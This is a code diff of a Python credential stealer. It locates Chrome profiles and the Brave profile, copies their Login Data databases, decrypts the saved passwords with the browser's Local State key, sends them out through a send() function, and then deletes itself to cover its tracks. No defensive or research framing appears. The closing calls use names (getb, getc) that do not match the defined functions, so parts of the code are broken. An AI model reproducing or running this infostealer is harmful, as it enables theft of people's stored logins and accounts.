@@ -4,8 +4,10 @@ import sqlite3
 import shutil
 import base64
 import json
+import requests
 import os
 import sys
+
 
 ID = 1410223644
 
@@ -27,31 +29,8 @@ except:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
 
 
-def chrome_date_and_time(chrome_data):
-    # Chrome_data format is 'year-month-date
-    # hr:mins:seconds.milliseconds
-    # This will return datetime.datetime Object
-    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
-
-
-def fetching_encryption_key():
-    # root_path will look
-    # like this below
-    # C: => Users => <Your_Name> => AppData =>
-    # Local => Google => Chrome => User Data =>
-    # Local State
-
-    root_path = os.environ(
-        ["USERPROFILE"],
-        "AppData",
-        "Local",
-        "Google",
-        "Chrome",
-        "User Data",
-        "Local State",
-    )
-
-    with open(root_path, "r", encoding="utf-8") as f:
+def getkey(keypath):
+    with open(keypath, "r", encoding="utf-8") as f:
         local_state_data = f.read()
         local_state_data = json.loads(local_state_data)
 
@@ -94,30 +73,16 @@ def password_decryption(password, encryption_key):
         # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except:
-        send("unencripted data : " + str(iv))
-
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
             return "No Passwords"
 
 
-def main():
-    key = fetching_encryption_key()
-    db_path = os.path.join(
-        os.environ["USERPROFILE"],
-        "AppData",
-        "Local",
-        "Google",
-        "Chrome",
-        "User Data",
-        "default",
-        "Login Data",
-    )
+def getcredt(dbpath, keypath):
     filename = "ChromePasswords.db"
-    shutil.copyfile(db_path, filename)
+    shutil.copyfile(dbpath, filename)
 
-    # connecting to the database
     db = sqlite3.connect(filename)
     cursor = db.cursor()
 
@@ -132,7 +97,7 @@ def main():
         main_url = row[0]
         login_page_url = row[1]
         user_name = row[2]
-        decrypted_password = password_decryption(row[3], key)
+        decrypted_password = password_decryption(row[3], getkey(keypath))
         date_of_creation = row[4]
         last_usuage = row[5]
 
@@ -143,36 +108,97 @@ def main():
 
         else:
             continue
-
-        # if date_of_creation != 86400000000 and date_of_creation:
-        #     print(
-        #         f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-
-        # if last_usuage != 86400000000 and last_usuage:
-        #     print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-        # print("=" * 100)
     cursor.close()
     db.close()
-
     try:
-        # trying to remove the copied db file as
-        # well from local computer
         os.remove(filename)
     except:
         pass
 
 
 def delete_file():
+    try:
+        os.remove("temp.txt")
+    except:
+        pass
+
+
+def getchrome():
+    root_path = os.path.join(
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"
+    )
+
+    dirs = os.listdir(root_path)
+    profiles = [i for i in dirs if i.startswith("Profile")]
+    print(profiles)
+
+    for i in profiles:
+        print(f"data from {i}")
+        p = os.path.join(root_path, i, "Login Data")
+        key_path = os.path.join(
+            os.environ["USERPROFILE"],
+            "AppData",
+            "Local",
+            "Google",
+            "Chrome",
+            "User Data",
+            "Local State",
+        )
+        getcredt(p, key_path)
+        try:
+            txt = temp_store("read")
+            for i in txt:
+                # print(i)
+                send(i)
+        except:
+            pass
+        print("\n")
+        delete_file()
+        print(f"success for {i}")
+
     os.remove(os.path.abspath(sys.argv[0]))
-    os.remove("temp.txt")
 
 
-if __name__ == "__main__":
-    main()
-    txt = temp_store("read")
-    for i in txt:
-        # print(i)
-        send(i)
-    # send(temp_store("read"))
-    print("success")
+def getbrave():
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "BraveSoftware",
+        "Brave-Browser",
+        "User Data",
+        "default",
+        "Login Data",
+    )
+    key_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "BraveSoftware",
+        "Brave-Browser",
+        "User Data",
+        "Local State",
+    )
+    getcredt(db_path, key_path)
+    try:
+        txt = temp_store("read")
+        for i in txt:
+            # print(i)
+            send(i)
+    except:
+        pass
+    print("\n")
     delete_file()
+    os.remove(os.path.abspath(sys.argv[0]))
+
+
+try:
+    getb()
+    send("all data sent for c")
+except:
+    send("cannot find the path for b, trying chrome.....")
+try:
+    getc()
+    send("all data sent for b")
+except:
+    send("cannot find the path for c")
